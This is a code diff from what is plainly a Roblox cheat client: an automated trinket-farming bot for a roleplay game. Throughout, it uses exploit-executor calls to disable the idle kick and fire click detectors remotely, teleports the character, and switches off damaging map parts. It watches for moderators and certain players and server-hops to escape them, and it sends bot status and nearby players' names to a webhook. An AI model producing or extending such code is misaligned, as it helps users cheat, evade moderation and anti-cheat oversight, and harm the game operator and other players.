+                        if not test_mode and mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                            utility:plain_webhook(string.format("**BOT KICKED**: Too far from first point (%.1f studs, max: 400) @here", distance_to_first))
+                            task.wait(1)
+                            plr:Kick(string.format("Too far from first point: %.1f studs (max: 400)", distance_to_first))
+                        end
+                        return
+                    end
+                end
+
+                local stay_in_server_manual = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                if not stay_in_server_manual then
+                    local proximity_check_distance = Options.ProximityCheck and Options.ProximityCheck.Value or 0
+                    if proximity_check_distance > 0 then
+                        local bot_pos = root.Position
+                        for _, other_player in next, plrs:GetPlayers() do
+                            if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                local distance = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+                                if distance <= proximity_check_distance then
+                                    trinket_bot.path_running = false
+                                    library:Notify(string.format("Player %s is within %d studs! Cannot start path.", other_player.Name, math.floor(proximity_check_distance)))
+                                    if not test_mode and mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                                        TrinketBotServerhop(string.format("Player %s within %d studs at spawn! Cannot start path - Serverhopping", other_player.Name, math.floor(proximity_check_distance)))
+                                    end
+                                    return
+                                end
+                            end
+                        end
+                    end
+                end
+
+                library:Notify(test_mode and "Starting test path..." or "Starting path...")
+
+                visited_positions = {}
+                collected_trinket_ids = {}
+                trinket_bot.pending_pickup_ids = {}
+                pending_pickup_ids = trinket_bot.pending_pickup_ids
+
+                if Toggles.auto_trinket then
+                    Toggles.auto_trinket:SetValue(false)
+                end
+
+                if not test_mode then
+                    mem:SetItem("botstarted", "true")
+                    if not mem:HasItem("serverhop_count") then
+                        mem:SetItem("serverhop_count", "0")
+                    end
+
+                    if trinket_bot.current_path_name and trinket_bot.current_path_name ~= "" then
+                        mem:SetItem("trinket_bot_path", trinket_bot.current_path_name)
+                    end
+
+                    start_loot_tracking()
+
+                    for _, connection in next, getconnections(plr.Idled) do
+                        connection:Disable()
+                    end
+                end
+
+                local character = plr.Character
+                if character then
+                    local humanoid = FindFirstChildOfClass(character, "Humanoid")
+                    if humanoid then
+                        humanoid:SetStateEnabled(5, false)
+                        humanoid:ChangeState(3)
+
+                        death_connection = track_connection("death", utility:Connection(humanoid.Died, function()
+                            if death_connection then
+                                pcall(function() death_connection:Disconnect() end)
+                            end
+
+                            trinket_bot.path_running = false
+                            pcall(function() library:Notify("Path stopped due to death") end)
+
+                            if trinket_bot.menu_only_stop then
+                                return
+                            end
+
+                            local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                            if test_mode then
+                                pcall(function() library:Notify("You died (test mode - not kicking)") end)
+                            elseif stay_in_server then
+                                pcall(function() library:Notify("You died (stay in server - not kicking)") end)
+                                pcall(function() utility:plain_webhook("@here bot died (stay in server mode)") end)
+                            else
+                                task.spawn(function()
+                                    pcall(function() utility:plain_webhook("@everyone bot died - kicking") end)
+                                    task.wait(0.3)
+                                    plr:Kick("bot died")
+                                end)
+                            end
+                        end))
+                    else
+                        trinket_bot.path_running = false
+                        if not test_mode and mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                            utility:plain_webhook("@everyone CRITICAL: Humanoid not found in ExecutePath - kicking for safety")
+                            library:Notify("CRITICAL: Humanoid not found - kicking")
+                            task.wait(0.5)
+                            plr:Kick("Humanoid not found - cannot set up death protection")
+                        end
+                        return
+                    end
+                else
+                    trinket_bot.path_running = false
+                    if not test_mode and mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                        utility:plain_webhook("@everyone CRITICAL: Character not found in ExecutePath - kicking for safety")
+                        library:Notify("CRITICAL: Character not found - kicking")
+                        task.wait(0.5)
+                        plr:Kick("Character not found - cannot set up death protection")
+                    end
+                    return
+                end
+
+                for _, other_player in next, plrs:GetPlayers() do
+                    if other_player ~= plr and is_moderator(other_player) then
+                        handle_moderator_detection(other_player)
+                        return
+                    end
+                end
+
+                if Toggles.SkipIllusionist and Toggles.SkipIllusionist.Value then
+                    for _, other_player in next, plrs:GetPlayers() do
+                        if other_player ~= plr and has_observe(other_player) then
+                            library:Notify("Illusionist detected! Serverhopping.")
+                            TrinketBotServerhop(string.format("Illusionist in server; %s - Serverhopping", other_player.Name))
+                            return
+                        end
+                    end
+                end
+
+                mod_connection = track_connection("mod", utility:Connection(Services.Players.PlayerAdded, function(player)
+                    if is_moderator(player) then
+                        handle_moderator_detection(player)
+                    end
+                end))
+
+                local glassmask_connection, glassmask_thrown_connection
+                local fimbul_escape_in_progress = false
+                local function handle_glassmask_detection(object)
+                    if object.Name == "GlassMask" and not fimbul_escape_in_progress then
+                        if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                            local bot_pos = plr.Character.HumanoidRootPart.Position
+                            task.wait(0.1)
+
+                            if object:IsA("BasePart") then
+                                local mask_pos = object:IsA("BasePart") and object.Position
+
+                                if mask_pos then
+                                    local distance = (mask_pos - bot_pos).Magnitude
+
+                                    if distance <= 300 then
+                                        fimbul_escape_in_progress = true
+                                        if glassmask_connection then glassmask_connection:Disconnect() end
+                                        if glassmask_thrown_connection then glassmask_thrown_connection:Disconnect() end
+
+                                        local nearby_players = {}
+                                        for _, other_player in next, plrs:GetPlayers() do
+                                            if other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                                local player_distance = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+                                                if player_distance <= 700 then
+                                                    local rogue_name = cheat_client:get_name(other_player) or "Unknown"
+                                                    table.insert(nearby_players, string.format("- %s (%s)", rogue_name, other_player.Name))
+                                                end
+                                            end
+                                        end
+
+                                        local player_list = #nearby_players > 0 and table.concat(nearby_players, "\n") or "- None"
+                                        library:Notify(string.format("!! FIMBULVETR/MANUS DEI detected %.0f studs away !!", distance))
+
+                                        if utility then
+                                            utility:plain_webhook(string.format("@everyone Fimbulvetr/Manus detected!\n\npossible opps:\n%s", player_list))
+                                        end
+
+                                        SafeServerhop(string.format("Fimbulvetr/Manus Dei detected %.0f studs away", distance))
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+
+                glassmask_connection = track_connection("glassmask", utility:Connection(workspace.ChildAdded, handle_glassmask_detection))
+                if FindFirstChild(workspace, "Thrown") then
+                    glassmask_thrown_connection = track_connection("glassmask_thrown", utility:Connection(workspace.Thrown.ChildAdded, handle_glassmask_detection))
+                end
+
+                if Toggles.SkipIllusionist and Toggles.SkipIllusionist.Value then
+                    for _, other_player in next, plrs:GetPlayers() do
+                        if other_player ~= plr then
+                            task.spawn(function()
+                                local backpack = FindFirstChild(other_player, "Backpack")
+                                if not backpack then
+                                    backpack = other_player:WaitForChild("Backpack", 10)
+                                end
+                                if not backpack then return end
+
+                                if has_observe(other_player) then
+                                    library:Notify("Illusionist in server! Serverhopping.")
+                                    TrinketBotServerhop(string.format("Illusionist in server; %s has Observe - Serverhopping", other_player.Name))
+                                    return
+                                end
+
+                                local conn = utility:Connection(backpack.ChildAdded, function(child)
+                                    if child.Name == "Observe" then
+                                        library:Notify("Illusionist detected! Serverhopping.")
+                                        TrinketBotServerhop(string.format("Illusionist detected; %s acquired Observe - Serverhopping", other_player.Name))
+                                    end
+                                end)
+                                table.insert(illu_connections, conn)
+                            end)
+
+                            local char_conn = utility:Connection(other_player.CharacterAdded, function(character)
+                                task.wait(0.5)
+                                if has_observe(other_player) then
+                                    library:Notify("Illusionist respawned! Serverhopping.")
+                                    TrinketBotServerhop(string.format("Illusionist detected; %s respawned with Observe - Serverhopping", other_player.Name))
+                                end
+                            end)
+                            table.insert(illu_connections, char_conn)
+                        end
+                    end
+
+                    local player_added_conn = utility:Connection(Services.Players.PlayerAdded, function(player)
+                        if player == plr then return end
+
+                        task.spawn(function()
+                            local backpack = FindFirstChild(player, "Backpack")
+                            if not backpack then
+                                backpack = player:WaitForChild("Backpack", 10)
+                            end
+                            if not backpack then return end
+
+                            task.wait(0.5)
+
+                            if has_observe(player) then
+                                library:Notify("Illusionist joined! Serverhopping.")
+                                TrinketBotServerhop(string.format("Illusionist joined; %s with Observe - Serverhopping", player.Name))
+                                return
+                            end
+
+                            local bp_conn = utility:Connection(backpack.ChildAdded, function(child)
+                                if child.Name == "Observe" then
+                                    library:Notify("Illusionist joined! Serverhopping.")
+                                    TrinketBotServerhop(string.format("Illusionist joined; %s acquired Observe - Serverhopping", player.Name))
+                                end
+                            end)
+                            table.insert(illu_connections, bp_conn)
+                        end)
+
+                        local char_added_conn = utility:Connection(player.CharacterAdded, function(character)
+                            task.wait(0.5)
+                            if has_observe(player) then
+                                library:Notify("Illusionist respawned! Serverhopping.")
+                                TrinketBotServerhop(string.format("Illusionist respawned; %s with Observe - Serverhopping", player.Name))
+                            end
+                        end)
+                        table.insert(illu_connections, char_added_conn)
+                    end)
+                    table.insert(illu_connections, player_added_conn)
+                end
+
+                proximity_warnings = {}
+                local emergency_gate_in_progress = false
+                local critical_serverhop_sent = false
+                local menu_on_non_23_triggered = false
+                local last_non_23_check = 0
+                local non_23_strike = 0   
+
+                local emergency_serverhop_connection
+                local emergency_conditions = Options.EmergencyServerhopConditions and Options.EmergencyServerhopConditions.Value or {}
+
+                if next(emergency_conditions) ~= nil then
+                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                    if not stay_in_server then
+                        for _, other_player in next, plrs:GetPlayers() do
+                            if other_player ~= plr and other_player.Character then
+                                for _, tool in next, other_player.Character:GetChildren() do
+                                    if tool:IsA("Tool") and emergency_conditions[tool.Name] then
+                                        library:Notify(string.format("Player %s already has %s - instant serverhop!", other_player.Name, tool.Name))
+                                        trinket_bot.path_running = false
+                                        TrinketBotServerhop(string.format("Player %s (%s) has dangerous item: %s - instant serverhop (detected on bot start)", other_player.Name, other_player.UserId, tool.Name))
+                                        break
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    emergency_serverhop_connection = track_connection("emergency_serverhop", utility:Connection(ws.Live.DescendantAdded, function(descendant)
+                        if not trinket_bot.path_running then return end
+                        local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                        if stay_in_server then return end
+
+                        if descendant:IsA("Tool") and emergency_conditions[descendant.Name] then
+                            local owner_player = nil
+                            local ancestor = descendant.Parent
+
+                            while ancestor and ancestor ~= ws.Live do
+                                if ancestor:IsA("Model") then
+                                    owner_player = plrs:GetPlayerFromCharacter(ancestor)
+                                    if owner_player then break end
+                                end
+                                ancestor = ancestor.Parent
+                            end
+
+                            if owner_player and owner_player ~= plr then
+                                library:Notify(string.format("Player %s has %s - instant serverhop!", owner_player.Name, descendant.Name))
+                                trinket_bot.path_running = false
+                                TrinketBotServerhop(string.format("Player %s (%s) has dangerous item: %s - instant serverhop", owner_player.Name, owner_player.UserId, descendant.Name))
+                            elseif not owner_player then
+                                library:Notify(string.format("Dangerous item %s detected in server - instant serverhop!", descendant.Name))
+                                trinket_bot.path_running = false
+                                TrinketBotServerhop(string.format("Dangerous item %s detected in server - instant serverhop (no owner identified)", descendant.Name))
+                            end
+                        end
+                    end))
+                end
+
+                local function get_proximity_distance()
+                    return Options.ProximityCheck and Options.ProximityCheck.Value or 0
+                end
+
+                local function emergency_path_traverse(current_pos, player_name)
+                    library:Notify("Emergency gate failed - attempting path traversal escape")
+
+                    local nearest_index = 1
+                    local nearest_distance = math.huge
+                    for i, point in ipairs(trinket_bot.path_points) do
+                        local distance = (point.position - current_pos).Magnitude
+                        if distance < nearest_distance then
+                            nearest_distance = distance
+                            nearest_index = i
+                        end
+                    end
+
+                    local function find_reachable_points(start_index, direction)
+                        local reachable = {}
+                        local last_pos = current_pos
+                        local step = direction == "forward" and 1 or -1
+
+                        for i = start_index + step, direction == "forward" and #trinket_bot.path_points or 1, step do
+                            local point = trinket_bot.path_points[i]
+                            if not point.is_gate_point then
+                                local distance = (point.position - last_pos).Magnitude
+                                if distance <= 450 then
+                                    table.insert(reachable, i)
+                                    last_pos = point.position
+                                else
+                                    break
+                                end
+                            end
+                        end
+
+                        return reachable
+                    end
+
+                    local forward_points = find_reachable_points(nearest_index, "forward")
+                    local reverse_points = find_reachable_points(nearest_index, "reverse")
+
+                    local points_to_traverse = #forward_points > #reverse_points and forward_points or reverse_points
+                    local direction_name = #forward_points > #reverse_points and "forward" or "reverse"
+
+                    if #points_to_traverse == 0 then
+                        library:Notify("No reachable escape points - serverhopping immediately")
+                        return true
+                    end
+
+                    library:Notify(string.format("Emergency escape: traversing %s (%d points)", direction_name, #points_to_traverse))
+
+                    for _, point_index in ipairs(points_to_traverse) do
+                        if not trinket_bot.path_running then
+                            library:Notify("Bot manually stopped during emergency escape")
+                            return false
+                        end
+
+                        local point = trinket_bot.path_points[point_index]
+                        library:Notify(string.format("Emergency escape: moving to point %d/%d", point_index, #trinket_bot.path_points))
+                        SmoothTeleport(point.position)
+                        task.wait(1.5)
+
+                        if plr.Character and not cs:HasTag(plr.Character, "Danger") then
+                            library:Notify("Danger cleared during emergency escape - serverhopping")
+                            return true
+                        end
+                    end
+
+                    library:Notify("Emergency escape: reached safe point, waiting for Danger to clear (Stop Bot to abort)")
+                    while plr.Character and cs:HasTag(plr.Character, "Danger") and trinket_bot.path_running do
+                        task.wait(0.1)
+                    end
+
+                    if not trinket_bot.path_running then
+                        library:Notify("Bot manually stopped during Danger wait")
+                        return false
+                    end
+
+                    library:Notify("Danger cleared after emergency escape - serverhopping")
+                    return true
+                end
+
+                local gnav_detected = false
+                local gnav_player_name = nil
+                local gnav_connections = trinket_bot.gnav_connections
+                local ice_dragon_skip_index = nil
+                local shrieker_detected_at_point = nil
+                local kick_gate_handled = false
+
+                local function detect_shrieker_near_position(position, radius)
+                    radius = radius or 150
+                    if not ws.Live then return false, nil, 0 end
+
+                    for _, child in pairs(ws.Live:GetChildren()) do
+                        if child:IsA("Model") and string.match(child.Name, ".Shrieker") then
+                            local shrieker_root = FindFirstChild(child, "HumanoidRootPart")
+                            if shrieker_root then
+                                local distance = (shrieker_root.Position - position).Magnitude
+                                if distance <= radius then
+                                    return true, child.Name, distance
+                                end
+                            end
+                        end
+                    end
+                    return false, nil, 0
+                end
+
+                local function detect_gnav(player)
+                    if not player or player == plr then return end
+                    if not trinket_bot.path_running then return end
+
+                    local backpack = FindFirstChild(player, "Backpack")
+                    if not backpack then return end
+
+                    local has_flower_god = FindFirstChild(backpack, "Flying Flower God")
+                    local has_mushroom_god = FindFirstChild(backpack, "Flying Mushroom God")
+
+                    if has_flower_god or has_mushroom_god then
+                        if not gnav_detected then
+                            gnav_detected = true
+                            gnav_player_name = player.Name
+                            local item_name = has_flower_god and "Flying Flower God" or "Flying Mushroom God"
+                            library:Notify(string.format("!! GNAV DETECTED: %s has %s - ending path early !!", player.Name, item_name))
+                        end
+                    end
+                end
+
+                do
+                    for _, player in next, plrs:GetPlayers() do
+                        if player.Character then
+                            task.spawn(detect_gnav, player)
+                        end
+
+                        local char_conn = utility:Connection(player.CharacterAdded, function(character)
+                            task.wait(0.5)
+                            task.spawn(detect_gnav, player)
+                        end)
+                        table.insert(gnav_connections, char_conn)
+                    end
+
+                    local player_added_conn = utility:Connection(plrs.PlayerAdded, function(player)
+                        local char_conn = utility:Connection(player.CharacterAdded, function(character)
+                            task.wait(0.5)
+                            task.spawn(detect_gnav, player)
+                        end)
+                        table.insert(gnav_connections, char_conn)
+                    end)
+                    table.insert(gnav_connections, player_added_conn)
+                end
+
+                proximity_connection = track_connection("proximity", utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
+                    if not test_mode and not menu_on_non_23_triggered and Toggles.MenuOnNon23 and Toggles.MenuOnNon23.Value and trinket_bot.path_running and mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                        local now = tick()
+                        if now - last_non_23_check >= 1 then
+                            last_non_23_check = now
+                            local player_count = get_current_server_player_count()
+                            if player_count < 23 then
+                                non_23_strike = non_23_strike + 1
+                                if non_23_strike >= 2 then
+                                    menu_on_non_23_triggered = true
+                                    menu_on_non_23(player_count)
+                                    return
+                                end
+                            else
+                                non_23_strike = 0
+                            end
+                        end
+                    end
+
+                    if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        local bot_pos = plr.Character.HumanoidRootPart.Position
+                        local critical_distance = Options.CriticalDistance and Options.CriticalDistance.Value or 60
+                        local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                        if critical_distance > 0 and not critical_serverhop_sent and not stay_in_server then
+                            for _, other_player in next, plrs:GetPlayers() do
+                                if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                    local distance = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+
+                                    if distance <= critical_distance then
+                                        critical_serverhop_sent = true
+                                        library:Notify(string.format("!! CRITICAL DANGER: Player %s within %.0f studs - immediate serverhop !!", other_player.Name, distance))
+                                        trinket_bot.path_running = false
+                                        SafeServerhop(string.format("Player %s within %.0f studs so am serverhopping instantly!!! (dangerously close)", other_player.Name, distance))
+                                        return
+                                    end
+                                end
+                            end
+
+                            if ws.Live then
+                                for _, child in pairs(ws.Live:GetChildren()) do
+                                    if child:IsA("Model") and string.match(child.Name, ".Shrieker") then
+                                        local shrieker_root = FindFirstChild(child, "HumanoidRootPart")
+                                        if shrieker_root then
+                                            local distance = (shrieker_root.Position - bot_pos).Magnitude
+                                            if distance <= critical_distance then
+                                                critical_serverhop_sent = true
+                                                library:Notify(string.format("!! CRITICAL DANGER: Shrieker within %.0f studs - immediate serverhop !!", distance))
+                                                trinket_bot.path_running = false
+                                                SafeServerhop(string.format("Shrieker within %.0f studs - serverhopping instantly!!! (necromancer attack)", distance))
+                                                return
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+
+                        if not ice_dragon_skip_index and trinket_bot.path_running then
+                            local iceDragon = ws:FindFirstChild("Ice Dragon")
+                            if iceDragon then
+                                local iceDragonRoot = FindFirstChild(iceDragon, "HumanoidRootPart")
+                                if iceDragonRoot then
+                                    local dragon_distance = (iceDragonRoot.Position - bot_pos).Magnitude
+                                    if dragon_distance <= 175 then
+                                        local current_index = 1
+                                        local min_dist = math.huge
+                                        for idx, pt in ipairs(trinket_bot.path_points) do
+                                            local dist = (pt.position - bot_pos).Magnitude
+                                            if dist < min_dist then
+                                                min_dist = dist
+                                                current_index = idx
+                                            end
+                                        end
+
+                                        for idx = current_index + 1, #trinket_bot.path_points do
+                                            local pt = trinket_bot.path_points[idx]
+                                            if pt then
+                                                if pt.is_gate_point then
+                                                    ice_dragon_skip_index = idx
+                                                    warn(string.format("Ice Dragon nearby! Skipping to gate point %d", idx))
+                                                    library:Notify(string.format("!! ICE DRAGON - skipping to gate point %d !!", idx))
+                                                    break
+                                                end
+                                                local dist_from_dragon = (pt.position - iceDragonRoot.Position).Magnitude
+                                                if dist_from_dragon >= 100 then
+                                                    ice_dragon_skip_index = idx
+                                                    warn(string.format("Ice Dragon nearby! Skipping to point %d (%.0f studs from dragon)", idx, dist_from_dragon))
+                                                    library:Notify(string.format("!! ICE DRAGON - skipping to point %d !!", idx))
+                                                    break
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    local proximity_check_distance = get_proximity_distance()
+                    local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                    if stay_in_server or proximity_check_distance == 0 then
+                        return
+                    end
+
+                    if shared.is_unloading or not trinket_bot.path_running then
+                        return
+                    end
+
+                    if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        return
+                    end
+
+                    local bot_pos = plr.Character.HumanoidRootPart.Position
+                    if emergency_gate_in_progress then
+                        return
+                    end
+
+                    local now = tick()
+
+                    for _, other_player in next, plrs:GetPlayers() do
+                        if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                            local distance = (other_player.Character.HumanoidRootPart.Position - bot_pos).Magnitude
+                            local state = proximity_warnings[other_player.UserId]
+
+                            if distance <= proximity_check_distance then
+                                local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                                if stay_in_server then
+                                    if not state then
+                                        proximity_warnings[other_player.UserId] = {
+                                            firstSeen = now,
+                                            lastSeen = now,
+                                            lastNotified = now
+                                        }
+                                        library:Notify(string.format("Stay in server enabled - ignoring player %s nearby", other_player.Name))
+                                    else
+                                        state.lastSeen = now
+                                    end
+                                else
+                                    if not state then
+                                        proximity_warnings[other_player.UserId] = {
+                                            firstSeen = now,
+                                            lastSeen = now,
+                                            lastNotified = now
+                                        }
+                                    else
+                                        state.lastSeen = now
+                                    end
+
+                                    if not emergency_gate_requested then
+                                        local encounter_data = player_encounters[other_player.UserId]
+                                        if not encounter_data then
+                                            player_encounters[other_player.UserId] = {
+                                                first_section = current_gate_section,
+                                                encounter_count = 1
+                                            }
+                                            library:Notify(string.format("Player %s detected within %d studs (first encounter)", other_player.Name, math.floor(proximity_check_distance)))
+
+                                            emergency_gate_requested = {
+                                                action = "gate_next",
+                                                player_name = other_player.Name
+                                            }
+                                        elseif encounter_data.first_section ~= current_gate_section then
+                                            encounter_data.encounter_count = encounter_data.encounter_count + 1
+                                            library:Notify(string.format("REPEAT encounter with %s - immediate serverhop (encounter #%d)", other_player.Name, encounter_data.encounter_count))
+                                            trinket_bot.path_running = false
+                                            SafeServerhop(string.format("Repeat encounter with %s", other_player.Name))
+                                            return
+                                        else
+                                            library:Notify(string.format("Player %s still in same section - emergency gating", other_player.Name))
+                                            emergency_gate_requested = {
+                                                action = "gate_next",
+                                                player_name = other_player.Name
+                                            }
+                                        end
+                                    else
+                                        if state and state.lastNotified and now - state.lastNotified >= 3 then
+                                            library:Notify(string.format("Player %s still within %d studs (emergency gate pending)", other_player.Name, math.floor(proximity_check_distance)))
+                                            state.lastNotified = now
+                                        end
+                                    end
+                                end
+                            else
+                                if state and now - state.lastSeen > 3 then
+                                    proximity_warnings[other_player.UserId] = nil
+                                end
+                            end
+                        end
+                    end
+                end)))
+
+
+                local trinkets_list = {}
+                for _,object in next, ws:GetChildren() do
+                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                        trinkets_list[#trinkets_list + 1] = object
+                    end
+                end
+
+                trinket_added_connection = track_connection("trinket_added", utility:Connection(ws.ChildAdded, function(object)
+                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                        trinkets_list[#trinkets_list + 1] = object
+                    end
+                end))
+
+                auto_trinket_connection = track_connection("auto_trinket", utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
+                    if not plr.Character or shared.is_unloading or not trinket_bot.path_running then return end
+
+                    if currently_dropping then return end
+
+                    if Toggles.ReequipGateInLoop and Toggles.ReequipGateInLoop.Value then
+                        local gate_in_backpack = FindFirstChild(plr.Backpack, "Gate")
+                        local gate_equipped = FindFirstChild(plr.Character, "Gate")
+                        if gate_in_backpack and not gate_equipped then
+                            local humanoid = FindFirstChildOfClass(plr.Character, "Humanoid")
+                            if humanoid then
+                                humanoid:EquipTool(gate_in_backpack)
+                            end
+                        end
+                    end
+
+                    for i = #trinkets_list, 1, -1 do
+                        if not trinkets_list[i] or not trinkets_list[i].Parent then
+                            table.remove(trinkets_list, i)
+                        end
+                    end
+
+                    for _, object in next, trinkets_list do
+                        local trinket_name, trinket_color, trinket_zindex = cheat_client:identify_trinket(object)
+                        local should_pickup = false
+                        local is_special_item = false
+                        local selected_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {}
+
+                        if trinket_name == "Azael Horn" or trinket_name == "Phoenix Down" or trinket_name == "Phoenix Flower" then
+                            is_special_item = true
+                            should_pickup = selected_mythics_artifacts[trinket_name] == true
+                        elseif trinket_name == "Ice Essence" then
+                            is_special_item = true
+                            should_pickup = Toggles.PickupIceEssence and Toggles.PickupIceEssence.Value
+                        elseif trinket_name == "Scroll" then
+                            is_special_item = true
+                            should_pickup = Toggles.PickupScrolls and Toggles.PickupScrolls.Value
+                        end
+
+                        if not is_special_item then
+                            local is_common = trinket_color == cheat_client.trinket_colors.common.Color
+                            local is_rare = trinket_color == cheat_client.trinket_colors.rare.Color
+                            local is_mythic = trinket_color == cheat_client.trinket_colors.mythic.Color
+                            local is_artifact = trinket_color == cheat_client.trinket_colors.artifact.Color
+                            local is_event = trinket_color == cheat_client.trinket_colors.event.Color
+
+                            if is_mythic or is_artifact then
+                                should_pickup = selected_mythics_artifacts[trinket_name] == true
+                            elseif is_event then
+                                should_pickup = Toggles.PickupEventItems and Toggles.PickupEventItems.Value
+                            elseif is_common or is_rare then
+                                should_pickup = Toggles.PickupTrinkets and Toggles.PickupTrinkets.Value
+                            end
+                        end
+
+                        if should_pickup then
+                            local click_detector = FindFirstChild(object, "ClickDetector", true)
+                            local distance = plr:DistanceFromCharacter(object.CFrame.Position)
+                            local dist = 9e9
+
+                            if click_detector then
+                                dist = click_detector.MaxActivationDistance
+                            end
+
+                            if click_detector and distance > 0 and distance < dist then
+                                local trinket_id = FindFirstChild(object, "ID")
+                                if trinket_id and trinket_id:IsA("StringValue") then
+                                    queue_pending_pickup(trinket_id.Value)
+                                end
+                                fireclickdetector(click_detector)
+                            end
+                        end
+                    end
+                end)))
+
+                local container
+                if game.PlaceId == 5208655184 then
+                    container = FindFirstChild(ws, "Map")
+                elseif game.PlaceId == 3541987450 then
+                    container = ws
+                end
+
+                local affected_bricks = {}
+                if container then
+                    for _, v in next, container:GetChildren() do
+                        local should_disable = false
+                        if v:IsA("BasePart") and FindFirstChild(v, "TouchInterest") then
+                            if not (cheat_client.safe_bricks[v.Name] or cheat_client.must_touch[v.BrickColor.Number]) then
+                                should_disable = true
+                            elseif v.Name == "Fire" then
+                                should_disable = true
+                            end
+
+                            if should_disable and v.CanTouch then
+                                affected_bricks[v] = true
+                                v.CanTouch = false
+                            end
+                        end
+                    end
+                end
+
+                local monsters = FindFirstChild(workspace, "MonstersSpawns") or FindFirstChild(workspace, "MonsterSpawns")
+                if monsters and FindFirstChild(monsters, "Triggers") then
+                    for _, obj in ipairs(monsters.Triggers:GetDescendants()) do
+                        if obj and obj.ClassName == "Part" then
+                            pcall(function()
+                                obj.CanTouch = false
+                            end)
+                        end
+                    end
+                end
+
+                local completed_wait_point = false
+                local path_has_gates = false
+                for _, check_point in ipairs(trinket_bot.path_points) do
+                    if check_point.is_gate_point then
+                        path_has_gates = true
+                        break
+                    end
+                end
+
+                if plr.Character and FindFirstChildOfClass(plr.Character, "ForceField") then
+                    library:Notify("Removing ForceField before starting path...")
+                    local character = plr.Character
+                    local teleport_platform = nil
+
+                    if character and FindFirstChild(character, "HumanoidRootPart") then
+                        local hrp = character.HumanoidRootPart
+                        local start_pos = hrp.Position
+
+                        teleport_platform = Instance.new("Part")
+                        teleport_platform.Size = Vector3.new(7, 1, 7)
+                        teleport_platform.Position = start_pos + Vector3.new(0, -3, 18)
+                        teleport_platform.Anchored = true
+                        teleport_platform.CanCollide = true
+                        teleport_platform.Transparency = 1
+                        teleport_platform.Parent = workspace
+
+                        trinket_bot.path_running = true
+                        SmoothTeleport(teleport_platform.Position + Vector3.new(0, 4, 0))
+                        task.wait(1.5)
+
+                        if character and not FindFirstChildOfClass(character, "ForceField") then
+                            library:Notify("ForceField removed - starting path")
+                        end
+
+                        if teleport_platform then
+                            teleport_platform:Destroy()
+                        end
+
+                        SmoothTeleport(start_pos)
+                        task.wait(0.5)
+                    end
+                end
+
+                local i = 1
+                while i <= #trinket_bot.path_points do
+                    if trinket_bot.moderator_detected then
+                        library:Notify("Moderator detected - exiting main loop")
+                        break
+                    end
+
+                    local point = trinket_bot.path_points[i]
+                    if gnav_detected then
+                        local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                        if stay_in_server then
+                            library:Notify(string.format("gnav %s detected but StayInServer enabled so am ignoring heh", gnav_player_name))
+                            gnav_detected = false
+                        else
+                            library:Notify(string.format("gnav %s detected so we are gating to last gate point to end path early", gnav_player_name))
+
+                            local last_gate_index = nil
+                            for j = #trinket_bot.path_points, 1, -1 do
+                                if trinket_bot.path_points[j].is_gate_point then
+                                    last_gate_index = j
+                                    break
+                                end
+                            end
+
+                            if last_gate_index then
+                                local stabilization_platform = nil
+                                if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                    local humanoid = FindFirstChildOfClass(plr.Character, "Humanoid")
+                                    local is_in_air = humanoid and (humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoid:GetState() == Enum.HumanoidStateType.Flying)
+
+                                    if is_in_air then
+                                        library:Notify("Bot in air [1]")
+                                        local hrp = plr.Character.HumanoidRootPart
+
+                                        stabilization_platform = Instance.new("Part")
+                                        stabilization_platform.Size = Vector3.new(10, 1, 10)
+                                        stabilization_platform.Position = hrp.Position - Vector3.new(0, 5, 0)
+                                        stabilization_platform.Anchored = true
+                                        stabilization_platform.CanCollide = true
+                                        stabilization_platform.Transparency = 1
+                                        stabilization_platform.Parent = workspace
+
+                                        task.wait(0.3)
+                                    end
+                                end
+
+                                local gate_success = Gate(trinket_bot.path_points[last_gate_index].gate_location)
+                                if stabilization_platform then
+                                    stabilization_platform:Destroy()
+                                    stabilization_platform = nil
+                                end
+
+                                if gate_success then
+                                    library:Notify(string.format("Gated to last gate point %d - continuing to end", last_gate_index))
+                                    i = last_gate_index + 1
+                                    gnav_detected = false
+                                    continue
+                                else
+                                    library:Notify("Gate to last point failed - serverhopping immediately")
+                                    trinket_bot.path_running = false
+                                    TrinketBotServerhop(string.format("GNAV detected (%s) but gate failed", gnav_player_name))
+                                    return
+                                end
+                            else
+                                library:Notify("No gate points in path - serverhopping immediately")
+                                trinket_bot.path_running = false
